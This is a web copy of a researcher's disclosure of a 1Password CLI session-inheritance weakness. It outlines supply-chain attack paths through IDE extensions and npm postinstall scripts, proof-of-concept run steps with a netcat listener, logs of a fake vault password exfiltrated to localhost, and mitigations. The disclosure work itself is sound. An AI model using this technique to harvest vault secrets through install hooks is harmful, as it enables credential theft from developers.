<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://codeberg.org/manchicken/1password-cli-vuln-disclosure">Original</a>
    <h1>1Password CLI Vulnerability (2023)</h1>
    
    <div id="readability-page-1" class="page"><div id="readme">

	

	
	<div>
		
		<div>
			
				
<p dir="auto">In October of 2023, I reported a vulnerability to 1Password regarding their <code>op</code> (a.k.a. <code>1password-cli</code>) program. In my report I detailed that their approach to prompting users only once, and then leaving the vault open to the CLI was easily exploited in supply-chain scenarios, especially when a threat actor targets developer toolchains. There are two attack paths I highlighted, and I supplied them with a proof for one of them.</p>

<p dir="auto">This demo was tested across the three most recent versions of macOS, using <code>zsh</code> and <code>bash</code> shells using the latest 1Password desktop client.</p>
<h2 id="user-content-two-attack-paths" dir="auto">Two Attack Paths</h2>
<p dir="auto">Both attacks would be a supply-chain attack, but there are two distinct paths:</p>
<h3 id="user-content-ide-path" dir="auto">IDE Path</h3>
<p dir="auto">The IDE path is pretty straight-forward, and I think carries the greatest risk:</p>
<ol dir="auto">
<li>I install the 1Password extension because I responsibly wish to keep my tokens in a safe place (e.g. not my <code>$ENV</code>)</li>
<li>I also use the MySQL extension in my IDE, it&#39;s nice to be able to stay in the same tool</li>
<li>I use the 1Password extension to resolve secret references, which requires me to unlock my vault</li>
<li>I installed a new red theme, red is my favorite color</li>
<li>That red theme is an extension, and contained malicious code which uses the <code>op</code> NPM module to enumerate and exfiltrate <em>every</em> vault that I have access to</li>
</ol>
<h3 id="user-content-package-manager-path" dir="auto">Package manager path</h3>
<ol dir="auto">
<li>I install the 1Password CLI, and I use <code>op</code> to protect secrets in my environment</li>
<li>I use GitHub Packages for NPM packages which are private to my organization</li>
<li>I hear of a really nifty plugin which will allow me to add syntax highlighting to shell output on this CLI project I&#39;m working on, so I <code>npm i syntax-highlighting-stuff</code></li>
<li>Oh no! <code>syntax-highlighting-stuff</code> had a <code>post-install</code> script on it, and it enumerated and exfiltrated the secrets from <em>every</em> vault I have access to</li>
</ol>
<h3 id="user-content-observed-patterns" dir="auto">Observed patterns</h3>
<p dir="auto">It seems like the vulnerability is that once you unlock your vault, anything spawned from the parent process of whatever opened the vault retains an active session to that open vault.</p>
<pre><code>$ op run -- ls <span># This prompts me to unlock my vault</span>
$ op run -- ls <span># The second call does not prompt me, the vault is already open</span>
$ op <span>read</span> <span>&#39;op://Foo/Bar/baz&#39;</span> <span># Still doesn&#39;t prompt me again because the vault is still open</span>
</code></pre><p dir="auto">This also works with subprocesses:</p>
<pre><code>$ <span>export</span> <span>GITHUB_TOKEN</span><span>=</span><span>&#39;op://Foo/Bar/baz&#39;</span>
$ op run -- env <span>|</span> grep GITHUB_TOKEN <span># This will prompt me</span>
$ bash <span># Start a new shell subprocess</span>
$ op run -- env <span>|</span> grep GITHUB_TOKEN <span># This will not prompt me</span>
$ bash <span># Now we&#39;re two shells deep in subprocesses</span>
$ op run -- env <span>|</span> grep GITHUB_TOKEN <span># This will still not prompt me</span>
</code></pre><h2 id="user-content-the-proof" dir="auto">The Proof</h2>
<p dir="auto">This repository contains the code from the proof that I submitted to 1Password on 2nd October, 2023. Here are the instructions for running the proof:</p>
<ul dir="auto">
<li>The <code>index.cjs</code> has a module which runs the <code>naughty</code> module.</li>
<li>Either using netcat or <a href="https://codeberg.org/manchicken/simple-exfil-service.git" rel="nofollow"><code>simple-exfil-service</code></a>, listen on port <code>4242</code></li>
<li>To run this test, simply run <code>op run npm install</code> like you needed a GitHub token</li>
<li>Afterward, check your output from port 4242, but also check to see if there is a <code>/tmp/naughty</code> file</li>
</ul>
<p dir="auto">Here&#39;s what the person running <code>npm i</code> would see:</p>
<pre><code>‚ùØ op run -- npm i

&gt; 1password-cli-risks@1.0.0 postinstall
&gt; node ./index.cjs

theItem:  <span>{</span>
  <span>&#34;id&#34;</span>: <span>&#34;[redacted]&#34;</span>,
  <span>&#34;title&#34;</span>: <span>&#34;Fake Website Login&#34;</span>,
  <span>&#34;version&#34;</span>: 1,
  <span>&#34;vault&#34;</span>: <span>{</span>
    <span>&#34;id&#34;</span>: <span>&#34;[redacted]&#34;</span>,
    <span>&#34;name&#34;</span>: <span>&#34;Employee&#34;</span>
  <span>}</span>,
  <span>&#34;category&#34;</span>: <span>&#34;LOGIN&#34;</span>,
  <span>&#34;last_edited_by&#34;</span>: <span>&#34;[redacted]&#34;</span>,
  <span>&#34;created_at&#34;</span>: <span>&#34;2023-10-02T17:28:50Z&#34;</span>,
  <span>&#34;updated_at&#34;</span>: <span>&#34;2023-10-02T17:28:50Z&#34;</span>,
  <span>&#34;additional_information&#34;</span>: <span>&#34;fake.user&#34;</span>,
  <span>&#34;fields&#34;</span>: <span>[</span>
    <span>{</span>
      <span>&#34;id&#34;</span>: <span>&#34;username&#34;</span>,
      <span>&#34;type&#34;</span>: <span>&#34;STRING&#34;</span>,
      <span>&#34;purpose&#34;</span>: <span>&#34;USERNAME&#34;</span>,
      <span>&#34;label&#34;</span>: <span>&#34;username&#34;</span>,
      <span>&#34;value&#34;</span>: <span>&#34;fake.user&#34;</span>,
      <span>&#34;reference&#34;</span>: <span>&#34;op://Employee/Fake Website Login/username&#34;</span>
    <span>}</span>,
    <span>{</span>
      <span>&#34;id&#34;</span>: <span>&#34;password&#34;</span>,
      <span>&#34;type&#34;</span>: <span>&#34;CONCEALED&#34;</span>,
      <span>&#34;purpose&#34;</span>: <span>&#34;PASSWORD&#34;</span>,
      <span>&#34;label&#34;</span>: <span>&#34;password&#34;</span>,
      <span>&#34;value&#34;</span>: <span>&#34;this-is-the-fake-password-in-plaintext&#34;</span>,
      <span>&#34;reference&#34;</span>: <span>&#34;op://Employee/Fake Website Login/password&#34;</span>,
      <span>&#34;password_details&#34;</span>: <span>{</span>
        <span>&#34;strength&#34;</span>: <span>&#34;FANTASTIC&#34;</span>
      <span>}</span>
    <span>}</span>,
    <span>{</span>
      <span>&#34;id&#34;</span>: <span>&#34;notesPlain&#34;</span>,
      <span>&#34;type&#34;</span>: <span>&#34;STRING&#34;</span>,
      <span>&#34;purpose&#34;</span>: <span>&#34;NOTES&#34;</span>,
      <span>&#34;label&#34;</span>: <span>&#34;notesPlain&#34;</span>,
      <span>&#34;reference&#34;</span>: <span>&#34;op://Employee/Fake Website Login/notesPlain&#34;</span>
    <span>}</span>
  <span>]</span>
<span>}</span>
Done.

up to date, audited <span>8</span> packages in 5s

found <span>0</span> vulnerabilities
</code></pre><p dir="auto">You can see that the demo attack is printing those values to STDOUT. I am only dumping one value, but the <code>op</code> program and JavaScript library do have the ability to enumerate items in a vault, and vaults themselves.</p>
<p dir="auto">Here&#39;s what my exfiltration server sees:</p>
<pre><code>Request Headers:  {
  host: &#39;localhost:4242&#39;,
  connection: &#39;keep-alive&#39;,
  &#39;content-type&#39;: &#39;text/plain;charset=UTF-8&#39;,
  accept: &#39;*/*&#39;,
  &#39;accept-language&#39;: &#39;*&#39;,
  &#39;sec-fetch-mode&#39;: &#39;cors&#39;,
  &#39;user-agent&#39;: &#39;node&#39;,
  &#39;accept-encoding&#39;: &#39;gzip, deflate&#39;,
  &#39;content-length&#39;: &#39;1082&#39;
}
Request URL:  /
Received data: {
  &#34;id&#34;: &#34;[redacted]&#34;,
  &#34;title&#34;: &#34;Fake Website Login&#34;,
  &#34;version&#34;: 1,
  &#34;vault&#34;: {
    &#34;id&#34;: &#34;[redacted]&#34;,
    &#34;name&#34;: &#34;Employee&#34;
  },
  &#34;category&#34;: &#34;LOGIN&#34;,
  &#34;last_edited_by&#34;: &#34;[redacted]&#34;,
  &#34;created_at&#34;: &#34;2023-10-02T17:28:50Z&#34;,
  &#34;updated_at&#34;: &#34;2023-10-02T17:28:50Z&#34;,
  &#34;additional_information&#34;: &#34;fake.user&#34;,
  &#34;fields&#34;: [
    {
      &#34;id&#34;: &#34;username&#34;,
      &#34;type&#34;: &#34;STRING&#34;,
      &#34;purpose&#34;: &#34;USERNAME&#34;,
      &#34;label&#34;: &#34;username&#34;,
      &#34;value&#34;: &#34;fake.user&#34;,
      &#34;reference&#34;: &#34;op://Employee/Fake Website Login/username&#34;
    },
    {
      &#34;id&#34;: &#34;password&#34;,
      &#34;type&#34;: &#34;CONCEALED&#34;,
      &#34;purpose&#34;: &#34;PASSWORD&#34;,
      &#34;label&#34;: &#34;password&#34;,
      &#34;value&#34;: &#34;this-is-the-fake-password-in-plaintext&#34;,
      &#34;reference&#34;: &#34;op://Employee/Fake Website Login/password&#34;,
      &#34;password_details&#34;: {
        &#34;strength&#34;: &#34;FANTASTIC&#34;
      }
    },
    {
      &#34;id&#34;: &#34;notesPlain&#34;,
      &#34;type&#34;: &#34;STRING&#34;,
      &#34;purpose&#34;: &#34;NOTES&#34;,
      &#34;label&#34;: &#34;notesPlain&#34;,
      &#34;reference&#34;: &#34;op://Employee/Fake Website Login/notesPlain&#34;
    }
  ]
}
</code></pre><p dir="auto">Notice that the <code>value</code> for the <code>password</code> is in plaintext in both cases.</p>
<h2 id="user-content-the-risk" dir="auto">The Risk</h2>
<p dir="auto">The 1Password CLI is marketed as a tool which makes technical practitioners safer by protecting credentials that are traditionally stored in plaintext in a user&#39;s environment variables on their local machine. This vulnerability demonstrates that while this does get the secrets out of your environment, it also <em>drastically</em> expands the potential blast radius for a successful malware or supply-chain attack.</p>
<p dir="auto">To put it simply: the risk here is not that your GitHub secret will be leaked via an environment variable, the risk is that <em>every vault you have access to</em> could be dumped by a threat actor.</p>
<p dir="auto">Additionally, as agentic AI tools become more commonplace, that may add additional risk factors which have yet to be considered in the research I&#39;m presenting here.</p>
<p dir="auto">The <code>op</code> tool doesn&#39;t just possess the ability to get individual items, it also has the ability to enumerate your vaults (<code>op vault list</code>) and to enumerate items in a given vault (<code>op item list --vault abc123</code>). <a href="https://github.com/1Password/op-js?tab=readme-ov-file#available-commands-and-functions" rel="nofollow">The JavaScript module supports all of the same commands</a> that the <code>op</code> CLI tool does, too.</p>
<h2 id="user-content-attempts-to-mitigate" dir="auto">Attempts to Mitigate</h2>
<p dir="auto">I have explored a number of paths to mitigate this.</p>
<ul dir="auto">
<li>Following the suggestion of a colleague, I experimented with using a separate vault for CLI secrets
<ul dir="auto">
<li>This doesn&#39;t work because you cannot limit the default vault from being read by the CLI</li>
<li>Not only that, but you can&#39;t set limits for things like shared vaults</li>
<li>As weird as it sounds, when you unlock one vault, you unlock all vaults which are accessible to the CLI tool</li>
</ul>
</li>
<li>1Password recommended using service accounts to mitigate this, and I did try it, but I found some challenges as I started thinking of how to roll it out to teams
<ul dir="auto">
<li>This kinda sucks because that means each developer gets a separate service account user on their workstation</li>
<li>This also means that the developer has to manage a service account</li>
<li>In addition to being unweildy, this also means that each engineer must be diligent to <em>not</em> enable the shiny &#34;Integrate with 1Password CLI&#34; button in the Developer tab on the GUI settings</li>
</ul>
</li>
</ul>
<h2 id="user-content-recommendations" dir="auto">Recommendations</h2>
<ul dir="auto">
<li>I recommend that folks avoid using <code>op</code> on developer workstations until 1Password has released a fix for these scenarios
<ul dir="auto">
<li>The best way to do this appears to be to make sure CLI integration checkbox is <em>unchecked</em> in the Developer settings screen.</li>
</ul>
</li>
<li>I recommend that when you <em>must</em> use <code>op</code>, that it be limited to service accounts, per 1Password&#39;s recommendation, and that you carefully verify that the &#34;Integrate with 1Password CLI&#34; box is unchecked in the GUI settings</li>
<li>I recomment that, where possible, you get in the habit of always passing <code>--ignore-scripts</code> to <code>npm</code> commands, and find a similar pattern for any other package manager that you use in conjunction with <code>op</code></li>
</ul>
<p dir="auto">I strongly recommend that 1Password modify their product to resolve this problem. Just spitballing, I think any of the following would be sufficient (this is an OR, not an AND):</p>
<ul dir="auto">
<li>Allow users to limit access to vaults using CLI integrations</li>
<li>Allow users to designate individual items in their Vaults for use with the CLI</li>
<li>Prompt for specific vaults or items individually</li>
<li>Prompt for each process individually, closing the gap for subprocesses</li>
</ul>
<h2 id="user-content-conclusion" dir="auto">Conclusion</h2>
<p dir="auto">This investigation took a while, and I waited a while before publishing this disclosure (life circumstances and giving 1Password time to fix the issue). While 1Password is within their right not to issue a CVE or a fix for this vulnerability, I do think 1Password users (I am proud to be one) would be much safer if this issue were eliminated.</p>
<p dir="auto">Thanks, please contact me with any corrections or feedback.</p>

			
		</div>
	</div>
</div></div>
  </body>
</html>
